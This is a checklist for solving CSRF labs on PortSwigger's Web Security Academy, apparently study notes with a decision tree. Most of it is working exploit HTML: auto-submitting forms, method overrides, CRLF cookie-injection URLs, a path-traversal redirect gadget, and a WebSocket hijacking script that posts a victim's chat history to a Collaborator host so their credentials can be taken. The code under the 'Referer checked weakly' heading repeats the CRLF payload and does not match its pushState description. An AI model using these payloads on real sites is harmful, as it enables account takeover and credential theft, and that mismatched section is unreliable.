# CSRF Mystery Lab — Solve Checklist

Work top to bottom. Each section maps to a decision point — stop as soon as you find your lab type.

---

## Phase 1 — Recon

- [ ] Log in and find a state-changing action (email change, password change, profile update)
- [ ] Intercept the POST request in Burp — inspect for a `csrf` token in the body, cookies, and response headers
- [ ] Note the session cookie's `SameSite` attribute: `Strict`, `Lax`, `None`, or absent (browser defaults to `Lax`)
- [ ] Check if the `Referer` header is present in the request

---

## Phase 2 — Identify the Bypass Path

### No defenses

- [ ] No CSRF token **and** no SameSite protection → use a basic POST form with auto-submit

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>document.forms[0].submit();</script>
```

---

### Token present — test these in order

- [ ] **Token only validated on POST?** → Change request method to GET in Burp. If it succeeds, omit `method="POST"` from the form (defaults to GET)
    
- [ ] **Token only validated when present?** → Remove the `csrf` param entirely and forward. If it succeeds, omit it from the exploit form
    
- [ ] **Token not tied to session?** → Intercept your own change-email request, **drop it** (don't forward), copy the unused `csrf` token, inject it into the exploit
    
    > ⚠️ You must drop the request before the token is consumed.
    
    ```html
    <input type="hidden" name="csrf" value="YOUR-CAPTURED-TOKEN">
    ```
    
- [ ] **Token tied to a non-session cookie (`csrfKey`)?** → CRLF-inject your `csrfKey` cookie via the search parameter, then submit the form with the matching `csrf` token value
    
    ```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="hacked@web-security-academy.net"> 
	<input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">	
</form> 

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    ```
    
- [ ] **Double-submit cookie pattern (csrf cookie = csrf param)?** → CRLF-inject an arbitrary value as the `csrf` cookie and use the same value in the POST body

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker_email@attacker_domain.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrf=YOUR-CSRF-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
---

### SameSite bypasses

- [ ] **SameSite=Lax — `_method` override:** Confirm the server accepts `_method=POST` on a GET request, then redirect via `document.location`
    
    ```html
    <script>
      document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
    </script>
    ```
    
- [ ] **SameSite=Lax — cookie refresh (OAuth):** Open a popup to trigger the OAuth flow, refreshing the session cookie, then POST within the 2-minute Lax window
    
    ```html
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>
    <p>Click anywhere on the page</p>
    <script>
      window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(() => document.forms[0].submit(), 5000);
      }
    </script>
    ```
    
- [ ] **SameSite=Strict — client-side redirect gadget:** Find an on-site redirect (e.g. `/post/comment/confirmation?postId=`) and path-traverse to change-email. The final request originates from the same site, bypassing Strict.
    
    ```html
    <script>
      document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@web-security-academy.net%26submit=1";
    </script>
    ```

- [ ]  **SameSite=Strict — sibling domain (CSWSH, requires Burp Collaborator):** The goal here is credential theft via WebSocket hijacking, not a form submission. The sibling domain's XSS is used to bypass SameSite=Strict so the victim's session cookie is included in the WebSocket handshake. **Steps:**
    
    1. Open the live chat and send a message. In Proxy → WebSockets history, confirm the browser sends `READY` on page load and the server responds with the full chat history
    2. Confirm no unpredictable token in the `GET /chat` WebSocket handshake — vulnerable to CSWSH
    3. Check response headers on static assets — look for `Access-Control-Allow-Origin` revealing the sibling domain: `cms-YOUR-LAB-ID.web-security-academy.net`
    4. Visit the sibling domain — find a login form where the username is reflected. Confirm reflected XSS: `<script>alert(1)</script>`
    5. In Repeater, convert the `POST /login` to a GET and confirm XSS still fires. Copy the URL — this is your XSS gadget
    6. Copy a Burp Collaborator payload
    7. Build the CSWSH script, URL-encode it entirely, then inject it as the `username` parameter via the sibling domain
    
    **Exploit server payload:**

```html
  <script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
  </script>
```

**CSWSH script (URL-encode this entire block before inserting above):**


```html
  <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
      ws.send("READY");
    };
    ws.onmessage = function(event) {
      fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
  </script>
```

8. Store and view exploit yourself → Collaborator → Poll now → confirm chat history received with your session cookie
9. Deliver to victim → Poll now → find username/password in chat history → log in as victim

> ⚠️ This lab requires **Burp Collaborator**. The key insight: because the XSS fires from the sibling domain (`cms-`), the browser treats the WebSocket handshake as same-site and includes the `SameSite=Strict` session cookie.
---

### Referer-based bypasses

- [ ] **Referer only validated when present?** → Add a `no-referrer` meta tag to suppress the header entirely
    
    ```html
    <meta name="referrer" content="no-referrer">
    ```
    
- [ ] **Referer checked weakly (just checks the domain appears somewhere in the URL)?** → Use `history.pushState` to append the lab domain as a query param, and add `Referrer-Policy: unsafe-url` in the exploit server Head section

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker_email@attacker_domain.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrf=YOUR-CSRF-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit()">
```


---

## Phase 3 — Build & Deliver

- [ ] Open the exploit server and paste your payload into the body
- [ ] Replace `YOUR-LAB-ID` (and any token/key placeholders) with real values
- [ ] Use a different email address than your own account's email
- [ ] Click **Store**, then **View exploit** — confirm it works on yourself first
- [ ] Click **Deliver exploit to victim** and verify the lab is solved

---

## Quick Reference — CRLF Cookie Injection

For labs using `csrfKey` (token tied to non-session cookie):

```
?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

For labs using double-submit cookie:

```
?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrf=YOUR-TOKEN%3b%20SameSite=None
```

---

## Decision Tree Summary

```
Intercept POST → check for csrf token
│
├── No token
│   └── Check SameSite
│       ├── None/absent → basic POST form
│       ├── Lax → _method=POST override OR cookie refresh
│       └── Strict → find on-site redirect gadget
│
└── Token present
    ├── Try GET method → succeeds? → token only validated on POST
    ├── Remove token → succeeds? → token only validated when present
    ├── Drop request, reuse token → succeeds? → token not tied to session
    ├── csrfKey cookie present? → CRLF-inject csrfKey + matching token
    └── csrf cookie = csrf param? → double-submit, inject any value via CRLF

Also check Referer header
├── Only validated when present? → no-referrer meta tag
└── Weak domain check? → history.pushState + unsafe-url policy
```

